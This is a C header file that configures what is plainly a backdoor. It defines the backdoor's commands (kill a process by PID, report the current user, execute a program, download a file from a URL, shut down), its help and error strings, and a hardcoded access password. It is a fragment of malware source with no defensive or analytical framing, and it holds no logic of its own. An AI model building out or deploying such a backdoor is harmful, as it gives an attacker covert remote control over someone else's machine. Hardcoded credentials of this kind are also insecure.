#ifndef __CONFIG__
#define __CONFIG__

#define CMD_KILL "kill"
#define CMD_WHOAMI "whoami"
#define CMD_EXEC "exec"
#define CMD_DOWNLOAD "download"
#define CMD_HELP "help"

#define CMD_BKD_SHUTDOWN "shutdown"

#define CMD_EXIT "exit"
#define CMD_NO_RECON "Command not recognized"

#define ERR_EPERM "Operation not permitted"
#define ERR_ESRCH "No process with this PID"
#define ERR_UNCAUGHT "Undefined error"
#define ERR_WHOAMI "Failed to get PID"

#define CMD_HELP_OUT "List of commands:\n  kill <PID>\n    Kills the process with the given PID.\n  whoami\n    Returns the current username that is executing the backdoor.\n  exec <program>\n    Executes the given program.\n  download <URL>\n    Downloads the given file URL.\n  shutdown\n    The backdoor shuts down"

#define CMD_END "\n\n"
#define CMD_WHOAMI_RET "Current user: "

#define AUTH_PWD "p4ssword"
#define AUTH_QUEST "Please, insert password: "
#define AUTH_SUCCESS "Authentication succeded\n\n"
#define AUTH_FAIL "Authentication failed\n\n"

#endif
